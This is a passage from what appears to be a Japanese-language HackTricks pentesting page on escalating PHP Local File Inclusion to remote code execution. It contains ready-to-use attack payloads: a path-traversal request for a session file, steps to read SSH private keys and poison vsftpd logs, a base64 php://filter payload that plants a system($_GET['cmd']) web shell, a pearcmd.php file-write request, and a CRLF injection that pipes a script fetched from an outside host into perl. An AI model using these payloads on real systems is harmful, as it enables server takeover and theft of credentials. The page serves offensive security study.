LFI を使って PHP のセッションファイルを含める
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh 経由

sshが有効な場合、どのユーザーが使用されているかを確認する (/proc/self/status & /etc/passwd) と、**\<HOME>/.ssh/id_rsa** にアクセスしてみる。

### **経由** **vsftpd** _**logs**_

FTP サーバー vsftpd のログは _**/var/log/vsftpd.log**_ にあります。Local File Inclusion (LFI) 脆弱性が存在し、公開された vsftpd サーバーにアクセスできる場合、次の手順を検討できます：

1. ログイン時のユーザー名フィールドに PHP ペイロードを注入する。
2. 注入後、LFI を利用してサーバーログ _**/var/log/vsftpd.log**_ を取得する。

### 経由 php base64 filter (using base64)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. これを利用してファイル拡張子のチェックをバイパスできます：末尾が ".php" で終わる base64 を渡すと、フィルタは "." を無視して "php" を base64 に付加します。以下はサンプルペイロードです：
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters 経由（ファイル不要）

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)は、**php filters を使って任意のコンテンツを出力として生成できる**ことを説明しています。つまり、include に渡す **任意の php code をファイルに書き込むことなく生成できる**ということです。


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault を利用

**Upload** して `/tmp` に **temporary** として保存されるファイルを用意し、同一の **same request** 内で **segmentation fault** を発生させると、**temporary file が削除されず**に残ることがあるため、それを検索できます。


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx の一時ファイル保存経由

もし **Local File Inclusion** を発見し、かつ **Nginx** が PHP の前段に動作している場合、次の手法で RCE を得られる可能性があります:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS 経由

`session.auto_start` が `Off` でセッションを持っていない場合でも、multipart POST データに **`PHP_SESSION_UPLOAD_PROGRESS`** を含めると PHP が自動的にセッションを有効にします。これを悪用して RCE を狙うことができます:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows の一時ファイルアップロード経由

もし **Local File Inclusion** を発見し、サーバが **Windows** 上で動作している場合、RCE を得られる可能性があります:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args を利用して

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)、`/usr/local/lib/phppearcmd.php` スクリプトは php docker イメージにデフォルトで存在します。さらに、URL パラメータに `=` が含まれない場合はそれを引数として扱うとされているため、URL 経由でスクリプトに引数を渡すことが可能です。See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)。

以下のリクエストは `/tmp/hello.php` に内容 `<?=phpinfo()?>` のファイルを作成します:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
以下は CRLF vuln を悪用して RCE を取得する例です（出典: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() 経由 (file_uploads = on)

もし **Local File Inclusion** を見つけ、file_uploads = on を公開している **phpinfo()** を持つファイルがあれば、RCE を得られます:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure 経由

もし **Local File Inclusion** を見つけ、テンポラリファイルのパスを **can exfiltrate the path** できるが、**server** が **checking** して **file to be included has PHP marks** かどうか確認している場合、この **Race Condition** でその **bypass that check** を試すことができます:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce 経由

もし LFI を悪用して **upload temporary files** し、サーバーが PHP の実行を **hang** させることができれば、何時間もかけてファイル名を **brute force filenames during hours** してテンポラリファイルを見つけることができます:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error に至る

もし `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` のいずれかを include すると（同じものを2回 include する必要があります）、そのエラーが発生します。

**これがどれほど役立つかは分かりませんが、可能性はあります。**\
_たとえ PHP Fatal Error を引き起こしても、アップロードされた PHP の一時ファイルは削除されます。_

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
